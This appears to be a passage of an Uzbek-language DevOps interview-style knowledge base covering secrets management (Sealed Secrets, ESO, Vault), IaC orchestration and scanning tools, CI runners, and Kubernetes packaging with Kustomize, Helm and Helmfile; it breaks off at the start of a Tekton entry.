**Qisqa javob:** Sealed Secrets (Bitnami) — `Secret`ni klaster public key'i bilan shifrlab `SealedSecret` CRD'ga aylantiradi; uni Git'ga xavfsiz commit qilish mumkin. Klasterdagi controller private key bilan ochib oddiy `Secret` yaratadi.

**Muammo:** GitOps'da hamma narsa Git'da bo'lishi kerak, lekin `Secret` YAML'i faqat base64 — shifrlanmagan. Uni Git'ga qo'yish = parolni ochiq e'lon qilish.

**Qanday ishlaydi:**
```text
dev: Secret.yaml --kubeseal (public cert)--> SealedSecret.yaml --git push-->
ArgoCD/Flux --> SealedSecret --> sealed-secrets-controller (private key) --> Secret
```
Shifr default `strict` scope: nom + namespace shifrga bog'langan — boshqa namespace'ga ko'chirib ochib bo'lmaydi.

**Amalda:**
```bash
kubectl create secret generic db --from-literal=password='S3cr3t' \
  --dry-run=client -o yaml | kubeseal --format yaml > db-sealed.yaml
git add db-sealed.yaml && git commit -m "db secret"
kubeseal --fetch-cert > pub.pem          # offline shifrlash uchun
# private key backup (DR uchun SHART)
kubectl -n kube-system get secret -l sealedsecrets.bitnami.com/sealed-secrets-key -o yaml > master-key.yaml
```

**Tuzoqlar:**
- Controller private key'ini backup qilmaslik — klaster qayta qurilsa barcha SealedSecret'lar ochilmaydi.
- Key rotatsiya (default har 30 kunda yangi key) eski secret'larni qayta shifrlamaydi; sizib chiqqan qiymatni almashtirish uchun **secret'ning o'zini** rotate qil.
- Ko'p klasterda har birining o'z key'i — bir xil secret'ni har klaster uchun alohida seal qilish kerak.

**Senior nuqta:** Sealed Secrets — sodda va tashqi bog'liqliksiz, lekin secret qiymati baribir Git tarixida (shifrlangan) yashaydi va markazlashgan rotatsiya/audit yo'q. Kattaroq tashkilotda ESO + Vault/cloud secret manager afzal; SOPS (age/KMS) — oraliq variant.

40677.a:
**Qisqa javob:** External Secrets Operator (ESO) — tashqi secret store'dan (AWS Secrets Manager/Parameter Store, HashiCorp Vault, GCP Secret Manager, Azure Key Vault, 1Password ...) qiymatlarni o'qib, klasterda oddiy Kubernetes `Secret` yaratadigan va davriy yangilab turadigan operator. Git'da faqat "qaysi secret'ni qayerdan olish" havolasi turadi.

**Muammo:** Secret'ning haqiqiy qiymati bitta markazda (vault) bo'lishi kerak: rotatsiya, audit, access policy. Klaster esa standart `Secret` kutadi.

**Qanday ishlaydi:**
```text
Git: ExternalSecret (ref: prod/db#password) --> ArgoCD --> klaster
ESO: SecretStore (auth: IRSA / Workload Identity / Vault k8s auth)
     --refreshInterval--> AWS Secrets Manager --> Kubernetes Secret "db"
pod --> envFrom / volume --> Secret "db"
```

**Amalda:**
```yaml
apiVersion: external-secrets.io/v1
kind: ClusterSecretStore
metadata: { name: aws }
spec:
  provider:
    aws:
      service: SecretsManager
      region: eu-central-1
      auth: { jwt: { serviceAccountRef: { name: eso, namespace: external-secrets } } }
---
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata: { name: db, namespace: api }
spec:
  refreshInterval: 1h
  secretStoreRef: { kind: ClusterSecretStore, name: aws }
  target: { name: db, creationPolicy: Owner }
  data:
    - secretKey: password
      remoteRef: { key: prod/db, property: password }
```
```bash
kubectl -n api get externalsecret db   # STATUS: SecretSynced, READY: True
```

**Tuzoqlar:**
- Secret yangilandi, lekin pod env'ni start paytida o'qigan — restart kerak (Reloader yoki checksum annotation).
- `ClusterSecretStore` har namespace'ga butun vault'ni ochadi — namespace/jamoa bo'yicha cheklangan `SecretStore` va IAM policy.
- Natija baribir etcd'dagi `Secret` — etcd encryption at rest va RBAC hali ham kerak.

**Senior nuqta:** ESO Git'dan secret qiymatini to'liq chiqaradi va rotatsiyani vault'ga topshiradi. Secret'ni etcd'ga umuman tushirmaslik kerak bo'lsa — Secrets Store CSI Driver yoki Vault Agent (to'g'ridan-to'g'ri fayl).

40678.a:
**Qisqa javob:** Vault Agent Injector — mutating admission webhook: pod'dagi annotation'larni ko'rib, unga `vault-agent-init` (init container) va `vault-agent` (sidecar) qo'shadi. Agent pod ServiceAccount'i bilan Vault'ga Kubernetes auth orqali kiradi, secret'larni olib `/vault/secrets/` dagi in-memory (tmpfs) faylga template bo'yicha yozadi va lease/TTL bo'yicha yangilab turadi.

**Muammo:** Dinamik secret'lar (har pod uchun alohida, qisqa muddatli DB login) va rotatsiya — statik Kubernetes `Secret` bilan qilib bo'lmaydi; ilova kodini Vault API'ga bog'lash ham istalmaydi.

**Qanday ishlaydi:**
```text
pod (annotation) --> kube-api --> vault-agent-injector (mutate)
pod: [init: vault-agent-init] -> [app] + [sidecar: vault-agent]
vault-agent --SA JWT--> Vault (auth/kubernetes, role) --> token
            --> database/creds/api (dinamik user, TTL 1h) --> /vault/secrets/db (tmpfs)
            --> TTL tugashidan oldin renew/qayta olish
```

**Amalda:**
```yaml
metadata:
  annotations:
    vault.hashicorp.com/agent-inject: "true"
    vault.hashicorp.com/role: "api"
    vault.hashicorp.com/agent-inject-secret-db: "database/creds/api"
    vault.hashicorp.com/agent-inject-template-db: |
      {{- with secret "database/creds/api" -}}
      postgres://{{ .Data.username }}:{{ .Data.password }}@db:5432/app
      {{- end }}
```
```bash
kubectl exec deploy/api -c api -- cat /vault/secrets/db
kubectl logs deploy/api -c vault-agent
```

**Tuzoqlar:**
- Ilova faylni faqat start'da o'qisa — yangilangan credential'ni ko'rmaydi. Faylni qayta o'qish yoki `agent-inject-command` bilan signal.
- Har pod'ga sidecar — resurs (CPU/memory) va start vaqti oshadi; Job'larda sidecar tugamaydi (`agent-pre-populate-only`).
- Vault ishlamasa init container yiqiladi — pod start bo'lmaydi; Vault HA shart.

**Senior nuqta:** Tanlov: Agent Injector (dinamik secret, template, sidecar narxi), CSI Driver (fayl mount, sidecar'siz), ESO (oddiy Secret, eng sodda integratsiya). Dinamik DB credential'lar kerak bo'lsa — Vault Agent eng to'liq yechim.

40679.a:
**Qisqa javob:** Atlantis — self-hosted server: Terraform/OpenTofu workflow'ini Pull Request ichiga ko'chiradi. PR ochilsa avtomatik `terraform plan` qiladi va natijani izoh sifatida yozadi; `atlantis apply` izohi bilan apply qilinadi. Bir directory/workspace'ni bir vaqtda faqat bitta PR lock qiladi.

**Muammo:** Har developer o'z noutbukidan `terraform apply` — kim, qachon, nima o'zgartirgani noma'lum; ikki kishi bir vaqtda apply; cloud admin kalitlari noutbuklarda.

**Qanday ishlaydi:**
```text
PR ochildi --webhook--> Atlantis --> terraform init/plan --> PR izohi: plan output
reviewer approve --> "atlantis apply" izohi --> apply --> natija izoh --> merge
lock: dir+workspace PR'ga bog'lanadi (boshqa PR "locked" xabarini oladi)
```

**Amalda (`atlantis.yaml`):**
```yaml
version: 3
projects:
  - name: prod-network
    dir: envs/prod/network
    workspace: default
    autoplan: { when_modified: ["*.tf", "../../modules/**/*.tf"] }
    apply_requirements: [approved, mergeable]
```
PR'da:
```text
atlantis plan -p prod-network
atlantis apply -p prod-network
atlantis unlock
```

**Tuzoqlar:**
- Atlantis server'da cloud admin credential'lari — u eng qimmat nishon. Uni tarmoqda izolyatsiyala, webhook secret'ni tekshir, `--repo-allowlist` qo'y.
- Fork'dan PR — zararli `.tf` (`external` data source, provider) plan paytida kod bajarishi mumkin. Fork PR'larda autoplan'ni o'chir.
- Apply merge'dan oldin bo'ladi — apply muvaffaqiyatsiz bo'lsa main va infra holati farqlanadi; jarayonni aniq kelishib ol.

**Senior nuqta:** Atlantis — bepul va oddiy; lekin policy (OPA/conftest), drift detection, RBAC'ni o'zing yig'asan. Kattaroq tashkilotlar Spacelift/Terraform Cloud/env0 ni shu sababli tanlaydi.

40680.a:
**Qisqa javob:** Spacelift — IaC uchun boshqariladigan (SaaS yoki self-hosted) orkestratsiya platformasi: Terraform, OpenTofu, Terragrunt, Pulumi, CloudFormation, Ansible, Kubernetes "stack"larini boshqaradi; OPA/Rego policy'lar, stack dependency'lari, drift detection, private worker pool va cloud OIDC integratsiyasi beradi.

**Muammo:** Umumiy CI (GitHub Actions) IaC uchun noqulay: state locking, plan/apply approval, stack'lar orasidagi output uzatish, drift'ni davriy tekshirish — hammasini qo'lda yozish kerak.

**Qanday ishlaydi:**
```text
Git push/PR --> Spacelift stack run
   plan --> policy (plan policy: "public S3 yo'q", approval policy: 2 reviewer)
        --> confirm --> apply (private worker, cloud OIDC role)
   stack A outputs --dependency--> stack B inputs
   cron: drift detection --> reconcile yoki alert
```

**Amalda (plan policy, Rego):**
```rego
package spacelift
deny[sprintf("public bucket taqiqlangan: %s", [r.address])] {
  r := input.terraform.resource_changes[_]
  r.type == "aws_s3_bucket_public_access_block"
  r.change.after.block_public_acls == false
}
```
Stack'lar odatda Terraform provider (`spacelift-io/spacelift`) bilan kod sifatida yaratiladi ("admin stack").

**Tuzoqlar:**
- Vendor lock-in va narx (worker/concurrency bo'yicha) — Atlantis/Terraform Cloud/env0 bilan solishtir.
- Policy'larni test qilmaslik — Rego xatosi hamma run'ni bloklaydi yoki hech narsani ushlamaydi.
- Private worker'larga keng IAM berish — stack bo'yicha alohida role.

**Senior nuqta:** IaC orkestratorini tanlash mezoni: nechta stack/jamoa, policy-as-code ehtiyoji, OpenTofu qo'llovi, self-hosted talabi va narx. 5-10 stack uchun Atlantis yetadi; yuzlab stack va jamoalarda boshqariladigan platforma operatsion vaqtni tejaydi.

40681.a:
**Qisqa javob:** ARC (Actions Runner Controller) — GitHub'ning rasmiy Kubernetes operatori: self-hosted GitHub Actions runner'larni pod sifatida yaratadi. Hozirgi "runner scale set" rejimida listener pod GitHub'dan navbatdagi job'lar sonini long-poll orqali oladi va `EphemeralRunnerSet`ni shunga mos scale qiladi (`minRunners`..`maxRunners`, 0 gacha).

**Muammo:** Doimiy VM runner'lar — kechasi bo'sh turib pul yeydi, kunduzi navbat hosil bo'ladi; holat job'lar orasida ifloslanadi.

**Qanday ishlaydi:**
```text
workflow: runs-on: arc-linux
GitHub job queue <--long poll-- listener pod (scale set)
                                  | "3 job kutyapti"
                                  v
                 EphemeralRunnerSet: replicas=3 --> 3 runner pod
                 har pod 1 job bajaradi -> o'chadi
```
Eski ARC (summerwind, `RunnerDeployment` + `HorizontalRunnerAutoscaler` webhook/pull metrikasi) — legacy, yangi o'rnatishda scale set ishlat.

**Amalda:**
```bash
helm install arc oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller -n arc-systems --create-namespace
helm install arc-linux oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \
  -n arc-runners --create-namespace \
  --set githubConfigUrl=https://github.com/org \
  --set githubConfigSecret=gh-app-secret \
  --set minRunners=0 --set maxRunners=50
kubectl -n arc-runners get ephemeralrunners
```
Workflow'da: `runs-on: arc-linux` (scale set nomi).

**Tuzoqlar:**
- `minRunners=0` — sovuq start: pod schedule + image pull + node autoscaler 1-3 daqiqa. Muhim repo'lar uchun 1-2 issiq runner.
- Docker-in-Docker kerak bo'lsa `containerMode: dind` — privileged pod, xavfsizlik riski; iloji bo'lsa `kubernetes` mode yoki Kaniko/BuildKit rootless.
- GitHub App o'rniga PAT bilan autentifikatsiya — keng ruxsat va bitta odamga bog'liq.

**Senior nuqta:** Runner pool'larni ishonch darajasi bo'yicha ajrat: public/fork PR'lar uchun alohida namespace/node pool (yoki umuman GitHub-hosted), prod deploy runner'lari alohida. ARC narxni tejaydi, lekin runner'lar sizning klasteringizda — ularning xavfsizligi endi sizning javobgarligingiz.

40682.a:
**Qisqa javob:** Ephemeral runner — bitta job uchun yaratilib, job tugashi bilan butunlay yo'q qilinadigan runner (pod/VM). Xavfsizlik foydasi: oldingi job qoldirgan fayl, credential, zararli jarayon yoki cache keyingi job'ga o'tmaydi; hujumchi doimiy o'rnashib (persistence) qololmaydi.

**Muammo:** Doimiy self-hosted runner'da bitta zararli PR (yoki buzilgan dependency) `~/.docker/config.json`, `~/.aws/credentials`, Git token'larni o'g'irlashi, fon jarayoni qoldirib keyingi prod deploy job'ini kuzatishi mumkin.

**Qanday ishlaydi:**
```text
persistent:  job1(PR, zararli) -> backdoor qoldi -> job2(prod deploy) -> secret o'g'irlandi
ephemeral:   job1 -> runner o'chirildi
             job2 -> toza runner (yangi pod/VM) -> backdoor yo'q
```

**Amalda:**
```bash
# klassik runner'ni ephemeral rejimda ro'yxatdan o'tkazish
./config.sh --url https://github.com/org --token $REG_TOKEN --ephemeral --unattended
```
ARC scale set'larda runner'lar default ephemeral. Qo'shimcha qattiqlashtirish:
```yaml
permissions: { contents: read }      # GITHUB_TOKEN minimal
# cloud'ga OIDC, uzoq muddatli kalit yo'q
- uses: aws-actions/configure-aws-credentials@v4
  with: { role-to-assume: arn:aws:iam::123:role/ci-deploy, aws-region: eu-central-1 }
```

**Tuzoqlar:**
- Ephemeral pod, lekin host Docker socket mount qilingan yoki privileged — konteynerdan node'ga chiqib, boshqa runner'larga ta'sir qilish mumkin.
- Node'ning cloud metadata endpoint'i (IMDS) ochiq — pod node IAM role'ini oladi. IMDSv2 hop limit=1 yoki NetworkPolicy bilan yop.
- Shared cache volume (npm, Docker layer) — cache poisoning orqali holat baribir o'tadi.

**Senior nuqta:** Ephemeral — zarur, lekin yetarli emas. To'liq model: ephemeral + izolyatsiya (alohida node pool yoki microVM, masalan Firecracker) + egress cheklovi + qisqa muddatli OIDC credential'lar + ishonchsiz kod uchun alohida runner guruhi.

40683.a:
**Qisqa javob:** Snyk — tijoriy developer security platformasi: **Snyk Open Source** (SCA — dependency zaifliklari va litsenziyalar), **Snyk Code** (SAST), **Snyk Container** (image, base image tavsiyasi), **Snyk IaC** (Terraform, K8s misconfig). IDE, CLI, SCM integratsiyasi va avtomatik fix PR'lar beradi.

**Muammo:** Zamonaviy ilova kodining 80-90% — open source dependency. Transitive dependency'dagi CVE'ni qo'lda kuzatib bo'lmaydi; developer'ga esa "nima qilishni" (qaysi versiyaga ko'tarish) aytish kerak.

**Qanday ishlaydi:**
```text
manifest/lockfile --> dependency graph (transitive bilan)
  --> Snyk vuln DB (o'z tadqiqot jamoasi) --> zaiflik + upgrade path + reachability
  --> CLI natija / PR check / fix PR / monitoring (yangi CVE chiqsa alert)
```

**Amalda:**
```bash
npm i -g snyk && snyk auth
snyk test --severity-threshold=high          # SCA, CI gate
snyk code test                               # SAST
snyk container test org/api:1.4.2 --file=Dockerfile   # base image tavsiyasi bilan
snyk iac test ./terraform
snyk monitor                                 # snapshot -> yangi CVE'lar uchun alert
```
`.snyk` faylida ignore (muddat va sabab bilan): `snyk ignore --id=SNYK-JS-XXX --expiry=2026-12-31 --reason="..."`.

**Tuzoqlar:**
- Hamma severity'ga gate — developer'lar `--no-verify`/ignore bilan aylanib o'tishni o'rganadi. Avval faqat yangi kiritilgan high/critical.
- Lockfile'siz loyiha — aniq versiyalar noma'lum, natija noaniq.
- Narx developer soni bo'yicha; ochiq kodli alternativalar: Trivy, Grype, OSV-Scanner, Semgrep, Dependabot.

**Senior nuqta:** Tool'dan muhimroq — jarayon: kim triage qiladi, SLA (critical 7 kun), istisnolar muddatli. Reachability (zaif funksiya haqiqatan chaqiriladimi) shovqinni sezilarli kamaytiradi.

40684.a:
**Qisqa javob:** SonarQube (SonarSource) — statik kod tahlili platformasi: bug, code smell, dublikat, murakkablik, test coverage va xavfsizlik (vulnerability, security hotspot) ni o'lchaydi. Asosiy mexanizm — **Quality Gate**: yangi kod shartlarga javob bermasa PR/pipeline yiqiladi.

**Muammo:** Code review'da inson null dereference, SQL injection pattern'i yoki 40% dublikatni har doim ko'rmaydi; texnik qarz sezilmasdan o'sadi.

**Qanday ishlaydi:**
```text
CI: build + test (coverage report) --> sonar-scanner --> SonarQube server
     --> tahlil (qoidalar to'plami: Quality Profile)
     --> Quality Gate: new code coverage >= 80%, new bugs = 0, duplication < 3%
     --> PR decoration (izohlar) + status OK/ERROR
```

**Amalda:**
```bash
docker run -d -p 9000:9000 sonarqube:lts-community
sonar-scanner \
  -Dsonar.projectKey=api \
  -Dsonar.host.url=https://sonar.org.com \
  -Dsonar.token=$SONAR_TOKEN \
  -Dsonar.go.coverage.reportPaths=coverage.out \
  -Dsonar.qualitygate.wait=true      # gate natijasini kutib exit code qaytaradi
```

**Tuzoqlar:**
- Gate'ni butun kod bazasiga qo'yish — eski loyihada darhol minglab issue. "Clean as You Code": faqat **new code** shartlari.
- Coverage foizini maqsad qilish — assert'siz testlar paydo bo'ladi.
- Community Edition'da branch/PR tahlili yo'q (Developer Edition kerak) yoki SonarCloud ishlat.

**Senior nuqta:** SonarQube SAST'i chuqur xavfsizlik tahlili uchun yagona manba emas — Semgrep/CodeQL bilan to'ldiriladi. Uning asosiy qiymati — sifat trendini ko'rinadigan qilish va yangi qarz qo'shilishini to'xtatish.

40685.a:
**Qisqa javob:** OWASP ZAP (hozir **ZAP by Checkmarx**) — ochiq kodli DAST tool: ishlab turgan web ilova/API'ga tashqaridan hujumchi kabi so'rov yuborib (spider, passive va active scan) XSS, SQL injection, xavfsiz bo'lmagan header'lar, cookie flag'lari kabi zaifliklarni topadi. CI'da Docker image va tayyor skriptlar bilan ishlaydi.

**Muammo:** SAST kodni ko'radi, lekin runtime konfiguratsiyasini (header'lar, TLS, auth oqimi, reverse proxy) ko'rmaydi. DAST — ishlayotgan tizimni tekshiradi.

**Qanday ishlaydi:**
```text
CI: deploy to ephemeral/staging env
  --> zap-baseline (spider + passive, ~1-2 min, xavfsiz)
  --> zap-full-scan (active hujumlar, uzoq, faqat test muhitda!)
  --> zap-api-scan (OpenAPI/GraphQL spec bo'yicha)
  --> HTML/JSON hisobot, rules.tsv bo'yicha FAIL/WARN/IGNORE
```

**Amalda:**
```bash
docker run --rm -v $(pwd):/zap/wrk -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://staging.app.com -r report.html -c rules.tsv
docker run --rm -v $(pwd):/zap/wrk -t ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py -t https://staging.app.com/openapi.json -f openapi
```
`rules.tsv`: `10038	FAIL	(CSP header yo'q)`, `10096	IGNORE	(timestamp)`.
Exit code: 0 ok, 1 FAIL bor, 2 faqat WARN.

**Tuzoqlar:**
- Active scan'ni prod'ga yuborish — haqiqiy ma'lumot yaratadi/o'chiradi, WAF bloklaydi.
- Auth sozlanmasa ZAP faqat login sahifasini ko'radi — authentication context/header bering.
- Baseline'da ko'p false positive — birinchi run'dan keyin rules.tsv bilan tuning.

**Senior nuqta:** DAST pipeline'ning oxirida (deploy'dan keyin) turadi va sekin — har PR'da baseline, kechasi full scan. U SAST/SCA'ni almashtirmaydi, balki konfiguratsiya va integratsiya xatolarini ushlaydigan qatlam.

40686.a:
**Qisqa javob:** Checkov (Prisma Cloud / Palo Alto, ochiq kodli) — IaC statik tahlil tool'i: Terraform (HCL va plan JSON), CloudFormation, Kubernetes manifest, Helm, Kustomize, Dockerfile, ARM/Bicep, GitHub Actions workflow'larini 1000+ qoida bo'yicha xavfsizlik va compliance misconfiguration'lariga tekshiradi; graph asosidagi (resurslar orasidagi bog'liqlik) qoidalar ham bor.

**Muammo:** Shifrlanmagan S3, `0.0.0.0/0` SSH, privileged pod — bularni apply'dan **oldin**, PR'da ushlash cloud'da tuzatishdan ancha arzon.

**Amalda:**
```bash
pip install checkov
checkov -d ./terraform --framework terraform --compact
# Check: CKV_AWS_20: "S3 Bucket has an ACL defined which allows public READ access"
#   FAILED for resource: aws_s3_bucket.assets
#   File: /s3.tf:1-10
terraform plan -out tf.plan && terraform show -json tf.plan > plan.json
checkov -f plan.json                     # modul va variable'lar hisoblangan holda
checkov -d . --soft-fail-on LOW --hard-fail-on HIGH,CRITICAL -o sarif > results.sarif
```
Istisno (sabab bilan):
```hcl
resource "aws_s3_bucket" "public_site" {
  # checkov:skip=CKV_AWS_20: statik sayt, public bo'lishi kerak
}
```
Custom qoida — Python yoki YAML'da.

**Tuzoqlar:**
- Faqat `.tf` fayllarni skanerlash — modul ichidagi va variable'ga bog'liq muammolar ko'rinmaydi; plan JSON'ni ham skanerla.
- Skip'larni sababsiz qo'yish — 6 oydan keyin hech kim nega ekanini bilmaydi.
- Checkov + Trivy + tfsec bir vaqtda — dublikat natijalar; bittasini tanla.

**Senior nuqta:** Skaner natijasini SARIF formatida GitHub Code Scanning'ga yuborish — developer natijani PR ichida ko'radi. Qoidalarni tashkilot standarti (CIS, SOC2) bilan moslab, faqat haqiqiy blokerlarni hard-fail qil.

40687.a:
**Qisqa javob:** tfsec (Aqua Security) — Terraform uchun tez statik xavfsizlik skaneri edi. 2023 dan beri u **Trivy** ga birlashtirilgan va yangi funksiyalar faqat Trivy'da: `trivy config` Terraform, CloudFormation, K8s, Helm, Dockerfile misconfiguration'larini o'sha qoidalar bilan tekshiradi.

**Muammo:** Ochiq security group, shifrlanmagan disk, public RDS, `*:*` IAM policy — PR bosqichida ushlash kerak.

**Amalda:**
```bash
brew install trivy
trivy config ./terraform
trivy config --severity HIGH,CRITICAL --exit-code 1 ./terraform
trivy config --tf-vars prod.tfvars ./terraform
```
Chiqish:
```text
main.tf (terraform)
HIGH: Security group rule allows ingress from public internet.
 AVD-AWS-0107
  12 |   cidr_blocks = ["0.0.0.0/0"]
```
Ignore (sabab bilan):
```hcl
#trivy:ignore:AVD-AWS-0107  # ALB public bo'lishi kerak
resource "aws_security_group_rule" "alb_https" { }
```
Eski `#tfsec:ignore:aws-ec2-no-public-ingress-sgr` izohlari Trivy'da ham taniladi.

**Tuzoqlar:**
- Yangi loyihada tfsec o'rnatish — u faqat bakim (maintenance) rejimida; Trivy'ga o't.
- Modullar `terraform init` qilinmagan bo'lsa remote modul ichi skanerlanmaydi.
- Custom Rego qoidalarni tfsec formatidan Trivy formatiga ko'chirish kerak bo'lishi mumkin.

**Senior nuqta:** Trivy'ning afzalligi — bitta binary image CVE, SBOM, secret va IaC'ni qamraydi, pipeline'da tool soni kamayadi. Natija — signal: CRITICAL/HIGH ni bloklagich qil, qolganini backlog'ga.

40688.a:
**Qisqa javob:** Infracost — Terraform/OpenTofu kodini (yoki plan JSON'ni) tahlil qilib, cloud narx API'lari asosida oylik xarajatni va PR qanchaga o'zgartirishini hisoblaydigan tool; natijani PR izohi sifatida yozadi va narx policy'larini qo'llay oladi.

**Muammo:** Developer `instance_type = "m5.large"` ni `"m5.4xlarge"` ga o'zgartiradi — review'da hech kim $500/oy farqni sezmaydi; xarajat oy oxirida hisob-fakturada ko'rinadi.

**Qanday ishlaydi:**
```text
terraform plan JSON --> Infracost resurs/atributlarni ajratadi
   --> Cloud Pricing API (AWS/Azure/GCP narxlari)
   --> base vs PR farqi --> PR izohi: "+$412/oy (+18%)"
usage-based resurslar (S3, Lambda) --> infracost-usage.yml dagi taxminlar
```

**Amalda:**
```bash
infracost auth login
infracost breakdown --path ./envs/prod
infracost breakdown --path . --format json --out-file base.json   # main branch
infracost diff --path . --compare-to base.json                    # PR branch
infracost comment github --path diff.json --repo org/infra \
  --pull-request $PR --github-token $GH_TOKEN --behavior update
```
Chiqish: resurs bo'yicha `Monthly Qty`, `Unit`, `Monthly Cost`, oxirida `OVERALL TOTAL`.

**Tuzoqlar:**
- Usage-based narxlar (egress, so'rovlar soni) default 0 — usage fayl bermasang haqiqiy xarajat kam ko'rinadi.
- Chegirmalar (Savings Plans, RI, EDP) hisobga olinmaydi — bu ro'yxat narxi.
- Har PR'ni narx bo'yicha bloklash — avval faqat ko'rsatish, keyin katta o'sishlar uchun approval.

**Senior nuqta:** FinOps'ning "shift-left" qismi: xarajatni qaror qabul qilinayotgan joyda (PR) ko'rsatish. Haqiqiy foyda — tag policy (har resursda `team`, `env`) bilan birga, keyin xarajatni jamoalarga ajratib ko'rsatish.

40689.a:
**Qisqa javob:** Kustomize — template'siz Kubernetes konfiguratsiya tool'i: oddiy YAML `base` ustiga muhitga xos `overlay`lar (patch, image tag, replicas, label, namespace, configMapGenerator) qo'yadi. `kubectl apply -k` ga o'rnatilgan; ArgoCD va Flux uni native qo'llaydi.

**Muammo:** dev/staging/prod uchun bir xil manifest'larning uch nusxasi — biriga tuzatish kiritib, boshqasini unutasan. Helm template'lari esa YAML'ni `{{ }}` bilan o'qib bo'lmas holga keltiradi.

**Qanday ishlaydi:**
```text
base/            deployment.yaml, service.yaml, kustomization.yaml
overlays/dev/    kustomization.yaml (resources: ../../base, replicas: 1)
overlays/prod/   kustomization.yaml (replicas: 5, patch: resources, image tag)
kustomize build overlays/prod --> yakuniy YAML --> ArgoCD/Flux apply
```

**Amalda:**
```yaml
# overlays/prod/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
namespace: api-prod
resources: [../../base]
images:
  - name: org/api
    newTag: "1.4.2"
replicas:
  - name: api
    count: 5
patches:
  - path: resources-patch.yaml
configMapGenerator:
  - name: api-config
    literals: [LOG_LEVEL=info]
```
```bash
kustomize build overlays/prod | less
kubectl diff -k overlays/prod
kustomize edit set image org/api:1.4.3     # CI'da tag yangilash
```

**Tuzoqlar:**
- `configMapGenerator` nomiga hash qo'shadi (`api-config-7h2k9`) — bu yaxshi (o'zgarsa pod restart bo'ladi), lekin eski ConfigMap'lar prune bo'lmasa to'planadi.
- `kubectl -k` ichidagi Kustomize versiyasi standalone'dan eski bo'lishi mumkin — funksiya farqlari.
- Juda chuqur overlay zanjirlari (base -> region -> env -> cluster) — o'qib bo'lmaydi.

**Senior nuqta:** Ko'p jamoa gibrid ishlatadi: uchinchi tomon software uchun Helm chart, o'z servislari uchun Kustomize, yoki Helm chart'ni Kustomize `helmCharts` bilan render qilib ustidan patch. GitOps'da "rendered manifest" yondashuvi (CI'da build qilib natijani commit) diff'ni aniq ko'rsatadi.

40690.a:
**Qisqa javob:** Helm — Kubernetes paket menejeri: manifest'lar Go template sifatida **chart**ga jamlanadi, `values.yaml` bilan parametrlanadi, versiyalanadi (repo yoki OCI registry'da) va release sifatida o'rnatiladi. GitOps'da Helm odatda faqat **render** vositasi — apply'ni ArgoCD/Flux qiladi.

**Muammo:** Postgres, ingress-nginx, cert-manager kabi murakkab software'ni o'nlab manifest bilan qo'lda yozish va yangilash amaliy emas; chart muallifi buni paketlab beradi.

**Qanday ishlaydi:**
```text
chart (templates/ + values.yaml + Chart.yaml)
   + sizning values (prod-values.yaml)
   --> helm template --> YAML
GitOps: ArgoCD repo-server `helm template` qiladi -> diff -> apply (helm release secret yo'q)
        Flux helm-controller haqiqiy `helm upgrade` qiladi (release history bor)
```

**Amalda (ArgoCD Application, Helm source):**
```yaml
source:
  repoURL: https://charts.bitnami.com/bitnami   # yoki oci://...
  chart: postgresql
  targetRevision: 16.2.1
  helm:
    releaseName: pg
    valuesObject:
      primary: { persistence: { size: 50Gi } }
```
```bash
helm template pg oci://registry-1.docker.io/bitnamicharts/postgresql --version 16.2.1 -f prod-values.yaml | less
helm show values ... > defaults.yaml       # qaysi parametrlar bor
helm lint ./mychart
```

**Tuzoqlar:**
- ArgoCD'da `helm list` bo'sh — chunki ArgoCD Helm release yaratmaydi; Helm hook'lari ArgoCD hook'lariga map qilinadi.
- `lookup` funksiyasi, `randAlphaNum` bilan parol yaratish — GitOps'da har render'da boshqacha natija, doimiy OutOfSync.
- Chart versiyasini pin qilmaslik — upstream o'zgarishi kutilmaganda deploy bo'ladi.

**Senior nuqta:** O'z servislaring uchun "umumiy chart" yozish qulay, lekin u tez orada hamma narsani parametrlaydigan monsterga aylanadi. Sodda servislarda Kustomize kamroq abstraksiya beradi.

40691.a:
**Qisqa javob:** Helmfile — bir nechta Helm release'ni (va ularning values'ini, muhitlarini, tartibini) bitta deklarativ `helmfile.yaml` da tasvirlab, `helmfile apply` bilan diff ko'rsatib o'rnatadigan CLI. `needs:` bilan dependency tartibi, `environments:` bilan dev/prod farqlari.

**Muammo:** Klaster "bazasi" — ingress, cert-manager, external-dns, prometheus — 10+ chart. Ularni shell skript ichida `helm upgrade` qatorlari bilan boshqarish — tartib, versiya va diff yo'q.

**Amalda:**
```yaml
# helmfile.yaml
repositories:
  - name: jetstack
    url: https://charts.jetstack.io
environments:
  dev: { values: [env/dev.yaml] }
  prod: { values: [env/prod.yaml] }
---
releases:
  - name: cert-manager
    namespace: cert-manager
    chart: jetstack/cert-manager
    version: v1.16.2
    values: [{ crds: { enabled: true } }]
  - name: api
    namespace: api
    chart: ./charts/api
    needs: [cert-manager/cert-manager]
    values: [values/api.yaml.gotmpl]
```
```bash
helmfile -e prod diff        # helm-diff plugin bilan farqni ko'rsatadi
helmfile -e prod apply       # faqat o'zgarganlarni upgrade qiladi
helmfile -e prod template > rendered.yaml
```

**Tuzoqlar:**
- Helmfile push-based: kimdir yoki CI uni ishga tushirishi kerak, drift'ni o'zi tuzatmaydi — bu GitOps emas.
- `helm-diff` plugin o'rnatilmasa `diff`/`apply` ishlamaydi.
- `.gotmpl` ichida ikki qatlam template (Helmfile + Helm) — debugging qiyin.

**Senior nuqta:** Helmfile CI/CD'da yoki klaster bootstrap'da yaxshi. To'liq GitOps uchun uning vazifasini ArgoCD ApplicationSet yoki Flux HelmRelease bajaradi; ArgoCD'da Helmfile'ni Config Management Plugin orqali ham ishlatish mumkin.

40692.a:
**Qisqa javob:** Tekton Pipelines — CI/CD'ni Kubernetes CRD'lari bilan yozish framework'i (CD Foundation): **Step** (container) -> **Task** (bir pod ichidagi step'lar) -> **Pipeline** (Task'lar DAG'i, `runAfter` bilan) ; bajarilishi `TaskRun`/`PipelineRun`. Har Task alohida ephemeral pod'da ishlaydi, ma'lumot `workspaces` (PVC) va `results` orqali uzatiladi.

**Muammo:** Jenkins kabi markaziy CI server — doimiy state, plugin do'zaxi, scale qilish qiyin. Tekton CI'ni Kubernetes'ning o'z resurslariga aylantiradi: scale, RBAC, izolyatsiya — klasterdan.

**Qanday ishlaydi:**
```text
EventListener (webhook) --> TriggerTemplate --> PipelineRun
